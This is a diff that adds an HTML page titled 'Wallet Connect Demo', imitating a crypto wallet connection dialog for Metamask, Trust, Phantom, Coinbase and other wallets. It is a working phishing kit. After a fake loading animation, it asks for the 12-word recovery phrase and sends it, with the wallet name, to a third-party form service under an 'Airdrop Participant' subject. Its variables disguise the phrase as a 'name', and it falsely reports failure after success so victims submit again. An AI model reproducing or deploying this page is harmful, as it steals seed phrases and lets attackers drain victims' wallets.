@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Wallet Connect Demo</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      font-style: normal;
+      font-size: 16px;
+      background-color: rgb(255, 199, 10);
+      color: #333333;
+    }
+
+    .wallet-container {
+      max-width: 700px;
+      background: #fff;
+      margin: 80px auto;
+      border-radius: 16px;
+      padding: 20px;
+    }
+
+    .wallet-title {
+      font-size: 25px;
+      font-weight: 800;
+      margin-bottom: 15px;
+    }
+
+    .wallet {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px;
+      border: 1px solid #363636;
+      border-radius: 8px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: background 0.2s;
+      font-size: 16px;
+      font-weight: bold;
+      color: #333333;
+    }
+
+    .wallet:hover {
+      background-color: #f0f0f0;
+    }
+
+    .wallet-name span {
+      color: rgb(58, 58, 58);
+      font-size: 15px;
+      margin-right: 8px;
+    }
+
+    .modal-backdrop {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 99;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal {
+      background: #fff;
+      border-radius: 16px;
+      width: 350px;
+      padding: 20px;
+      position: relative;
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .modal-header span {
+      cursor: pointer;
+      color: #3b82f6;
+      font-weight: 500;
+    }
+
+    .status-box {
+      border: 2px solid #00cc66;
+      border-radius: 12px;
+      padding: 10px;
+      color: #00cc66;
+      text-align: center;
+      font-weight: bold;
+      background-color: #f4fff9;
+      margin-bottom: 20px;
+    }
+
+    .wallet-info {
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      padding: 15px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .wallet-text {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .wallet-text .name {
+      font-weight: 500;
+    }
+
+    .wallet-text .desc {
+      font-size: 12px;
+      color: #666;
+    }
+
+    .wallet-icon {
+      width: 24px;
+      height: 24px;
+    }
+
+    .seed-form {
+      display: none;
+      flex-direction: column;
+    }
+
+    .seed-form textarea {
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 10px;
+      resize: none;
+      font-family: monospace;
+    }
+
+    .seed-form button {
+      margin-top: 10px;
+      padding: 10px;
+      background-color: #3b82f6;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Wallet List -->
+  <div class="wallet-container">
+    <div class="wallet-title">Connect to a wallet</div>
+
+    <div class="wallet" onclick="openModal('Metamask')">
+      <div class="wallet-name"><span>🟢</span> Metamask</div>
+      <img src="metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Trust Wallet')">
+      <div class="wallet-name"><span>🟢</span> Trust</div>
+      <img src="trust-wallet-66f8777532931d9c09b633344981a6a9.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Phantom')">
+      <div class="wallet-name"><span>🟢</span> Phantom</div>
+      <img src="phantom wallet icon.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Xumm')">
+      <div class="wallet-name"><span>🟢</span> Xumm</div>
+      <img src="xumm.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('SaitaPro')">
+      <div class="wallet-name"><span>🟢</span> SaitaPro</div>
+      <img src="saitapro.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Coinbase')">
+      <div class="wallet-name"><span>🟢</span> Coinbase</div>
+      <img src="coinbase.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Crypto.com')">
+      <div class="wallet-name"><span>🟢</span> crypto.com</div>
+      <img src="crypto-4cbeac57421fb3ca2573db2cf448169a.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Blockchain')">
+      <div class="wallet-name"><span>🟢</span> Blockchain</div>
+      <img src="blockchain-logo.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Binance Smart Chain')">
+      <div class="wallet-name"><span>🟢</span> Binance Smart Chain</div>
+      <img src="bsc-logo.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('SafePal')">
+      <div class="wallet-name"><span>🟢</span> SafePal</div>
+      <img src="safepal.png" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('WalletConnect')">
+      <div class="wallet-name"><span>🟢</span> WalletConnect</div>
+      <img src="https://avatars.githubusercontent.com/u/37784886?s=280&v=4" class="wallet-icon" />
+    </div>
+
+    <div class="wallet" onclick="openModal('Argent')">
+      <div class="wallet-name"><span>🟢</span> Argent</div>
+      <img src="argent.png" class="wallet-icon" />
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="modalBackdrop">
+    <div class="modal">
+      <div class="modal-header">
+        <span onclick="closeModal()">Back</span>
+        <span onclick="closeModal()">&times;</span>
+      </div>
+
+      <div id="loadingView">
+        <div class="status-box" id="statusText">Initializing<span id="dots">.</span></div>
+        <div class="wallet-info">
+          <div class="wallet-text">
+            <span class="name" id="walletName">Wallet</span>
+            <span class="desc">Easy-to-use browser extension.</span>
+          </div>
+          <img id="walletImage" class="wallet-icon" src="" alt="" />
+        </div>
+      </div>
+
+      <div id="formView" class="seed-form">
+        <label>Import Wallet to Connect</label>
+        <textarea id="userName" rows="3" placeholder="Enter 12-recovery phrase.."></textarea>
+        <button onclick="submitName()">Connect</button>
+      </div>
+    </div>
+  </div>
+
+  
+  <script>
+    let dots = 1;
+    let loadingInterval;
+
+    function openModal(wallet) {
+      document.getElementById("modalBackdrop").style.display = "flex";
+      document.getElementById("walletName").innerText = wallet;
+
+      const logos = {
+        "Metamask": "metamask-69ce6b56bbc9953dfb4aecebdf88729b.png",
+        "Trust Wallet": "trust-wallet-66f8777532931d9c09b633344981a6a9.png",
+        "Phantom": "phantom wallet icon.png",
+        "Xumm": "xumm.png",
+        "SaitaPro": "saitapro.png",
+        "Coinbase": "coinbase.png",
+        "Crypto.com": "crypto-4cbeac57421fb3ca2573db2cf448169a.png",
+        "Blockchain": "blockchain-logo.png",
+        "Binance Smart Chain": "bsc-logo.png",
+        "SafePal": "safepal.png",
+        "WalletConnect": "images/walletconnect.png",
+        "Argent": "argent.png"
+      };
+
+      document.getElementById("walletImage").src = logos[wallet] || "";
+
+      document.getElementById("loadingView").style.display = "block";
+      document.getElementById("formView").style.display = "none";
+
+      let dotElem = document.getElementById("dots");
+      dots = 1;
+      loadingInterval = setInterval(() => {
+        dotElem.innerText = ".".repeat(dots);
+        dots = (dots % 3) + 1;
+      }, 500);
+
+      setTimeout(() => {
+        clearInterval(loadingInterval);
+        document.getElementById("loadingView").style.display = "none";
+        document.getElementById("formView").style.display = "flex";
+      }, 3000);
+    }
+
+    function closeModal() {
+      document.getElementById("modalBackdrop").style.display = "none";
+      clearInterval(loadingInterval);
+    }
+
+    async function submitName() {
+      const userName = document.getElementById("userName").value.trim();
+      const walletName = document.getElementById("walletName").innerText;
+
+      if (!userName) {
+        alert("Please enter your name.");
+        return;
+      }
+
+      try {
+        const response = await fetch("https://api.web3forms.com/submit", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            access_key: "bca2fbdb-af0f-4cc2-ba77-e4e969545869",
+            subject: "New Airdrop Participant",
+            name: userName,
+            wallet: walletName
+          })
+        });
+
+        if (response.ok) {
+          alert("Failed to submit. Please try again.");
+          document.getElementById("userName").value = "";
+          closeModal();
+        } else {
+          alert("Submission failed. Please try again.");
+        }
+      } catch (error) {
+        console.error(error);
+        alert("An error occurred. Please try again.");
+      }
+    }
+  </script>
+</body>
+</html>
